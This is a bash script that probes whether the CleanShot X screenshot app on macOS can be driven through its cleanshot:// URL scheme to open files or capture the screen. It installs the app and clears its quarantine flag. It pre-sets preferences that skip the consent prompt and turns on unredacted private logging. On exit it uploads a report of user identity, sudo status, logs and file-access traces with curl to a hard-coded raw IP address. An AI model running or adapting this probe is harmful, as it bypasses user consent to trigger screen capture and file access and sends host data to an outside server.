#!/bin/bash
# CleanShot X probe v10 — install app to /Applications so LaunchServices registers the scheme,
# then deliver URL directly to the app with `open -a` and watch for real file access.
OUT=/tmp/csx-report-v10.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v10"
DOMAIN="pl.maketheweb.cleanshotx"
SUITE="AFJU4P8ZV4.pl.maketheweb.cleanshotx"
TARGET="/Applications/CleanShot X.app"

finish() {
  echo "=== EXIT $? ==="
  curl -s --max-time 60 -X POST --data-binary @/tmp/csx-report-v10.txt "$DROP_URL" || true
}
trap finish EXIT

echo "=== ENV ==="
sw_vers; uname -m; id; sudo -n true && echo SUDO_OK || echo SUDO_NO

sudo log config --mode "private_data:on" 2>&1

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
APP="$MP/CleanShot X.app"

echo "=== INSTALL TO /Applications ==="
sudo rm -rf "$TARGET"
sudo ditto "$APP" "$TARGET"
sudo xattr -dr com.apple.quarantine "$TARGET" 2>&1
ls -ld "$TARGET"
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$TARGET" 2>&1
sleep 3

echo "=== LS REGISTRATION CHECK ==="
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump 2>/dev/null | grep -iB2 -A6 "cleanshot" | head -40
echo "--- default handler query:"
python3 - <<'PY'
import subprocess
# ask LaunchServices which app handles the scheme via `open -h`? not available; use lsappinfo
out=subprocess.run(["lsappinfo","find","bundleid=pl.maketheweb.cleanshotx"],capture_output=True,text=True)
print(out.stdout, out.stderr)
PY

for D in "$DOMAIN" "$SUITE"; do
  defaults write "$D" allowURLSchemesAPI -bool true
  defaults write "$D" didAskAboutURLSchemesAPI -bool true
  defaults write "$D" _allowURLSchemes -bool true
done

echo "=== LAUNCH ==="
open -a "$TARGET"
sleep 12
PID=$(pgrep -f "CleanShot X.app/Contents/MacOS" | head -1)
echo "PID=$PID"

python3 - <<'PY'
import struct, zlib
def png(path,color,w=64,h=64):
    raw=b''.join(b'\x00'+bytes(color)*w for _ in range(h))
    def ch(t,d):
        c=t+d
        return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
    open(path,'wb').write(b'\x89PNG\r\n\x1a\n'+ch(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))+ch(b'IDAT',zlib.compress(raw))+ch(b'IEND',b''))
png('/tmp/csx_canary.png',(200,0,200))
PY
chmod 644 /tmp/csx_canary.png

echo "=== T1: open -a APP URL (pin filepath) ==="
T=$(date -u '+%Y-%m-%d %H:%M:%S'); echo "T=$T"
sudo fs_usage -w -f filesys > /tmp/fs1.txt 2>&1 & FS=$!
sleep 1
open -a "$TARGET" "cleanshot://pin?filepath=/tmp/csx_canary.png"
sleep 5
kill $FS 2>/dev/null
echo "--- fs hits:"
grep -i "csx_canary" /tmp/fs1.txt | head -10
echo "--- lsof:"
lsof -p "$PID" 2>/dev/null | grep -i csx_canary | head -5
echo "--- app log:"
log show --start "$T" --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | tail -25

echo "=== T2: capture-fullscreen via open -a ==="
T=$(date -u '+%Y-%m-%d %H:%M:%S'); echo "T=$T"
sudo fs_usage -w -f filesys > /tmp/fs2.txt 2>&1 & FS=$!
sleep 1
open -a "$TARGET" "cleanshot://capture-fullscreen"
sleep 6
kill $FS 2>/dev/null
grep -iE "screenshot|capture|Desktop" /tmp/fs2.txt | head -10
log show --start "$T" --predicate 'process == "CleanShot X" OR eventMessage CONTAINS "kTCCServiceScreenCapture"' --style compact 2>/dev/null | grep -iE "screen|capture|denied|allow" | tail -15

echo "=== T3: open-annotate via open -a ==="
T=$(date -u '+%Y-%m-%d %H:%M:%S'); echo "T=$T"
sudo fs_usage -w -f filesys > /tmp/fs3.txt 2>&1 & FS=$!
sleep 1
open -a "$TARGET" "cleanshot://open-annotate?filepath=/tmp/csx_canary.png"
sleep 6
kill $FS 2>/dev/null
grep -i "csx_canary" /tmp/fs3.txt | head -10
log show --start "$T" --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | tail -25

echo "=== T4: plain open URL (scheme resolution) ==="
T=$(date -u '+%Y-%m-%d %H:%M:%S'); echo "T=$T"
open "cleanshot://capture-fullscreen"; echo "rc=$?"
sleep 5
log show --start "$T" --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | tail -10

echo "=== DEFAULTS AFTER ==="
defaults read "$DOMAIN" 2>&1 | head -30
echo "--- suite:"
defaults read "$SUITE" 2>&1 | head -30

echo "=== DONE ==="
exit 0
